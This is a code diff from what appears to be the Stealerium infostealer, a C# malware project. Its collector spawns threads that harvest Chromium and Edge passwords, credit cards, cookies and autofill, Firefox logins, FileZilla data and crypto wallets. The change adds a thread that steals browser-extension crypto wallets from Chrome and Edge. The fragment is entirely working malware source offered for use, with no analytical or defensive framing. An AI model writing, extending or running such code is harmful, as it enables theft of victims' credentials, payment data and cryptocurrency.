@@ -4,7 +4,6 @@ using System.IO;
 using System.Threading;
 using Stealerium.Clipper;
 using Stealerium.Target;
-using Stealerium.Target.Browsers.Chromium;
 using Stealerium.Target.Gaming;
 using Stealerium.Target.Messengers;
 using Stealerium.Target.System;
@@ -29,7 +28,7 @@ namespace Stealerium.Helpers
                 // Chromium & Edge thread (credit cards, passwords, cookies, autofill, history, bookmarks)
                 threads.Add(new Thread(() =>
                 {
-                    Recovery.Run(sSavePath + "\\Browsers");
+                    Target.Browsers.Chromium.Recovery.Run(sSavePath + "\\Browsers");
                     Target.Browsers.Edge.Recovery.Run(sSavePath + "\\Browsers");
                 }));
                 // Firefox thread (logins.json, db files, cookies, history, bookmarks)
@@ -89,6 +88,13 @@ namespace Stealerium.Helpers
                 threads.Add(new Thread(() =>
                     Wallets.GetWallets(sSavePath + "\\Wallets")
                 ));
+
+                // Write Browser Wallets
+                threads.Add(new Thread(() =>
+                {
+                    Target.Browsers.Chromium.Extensions.GetChromeWallets(sSavePath + "\\Wallets\\Chrome_Wallet");
+                    Target.Browsers.Edge.Extensions.GetEdgeWallets(sSavePath + "\\Wallets\\Edge_Wallet");
+                }));
 
                 // Write FileZilla
                 threads.Add(new Thread(() =>
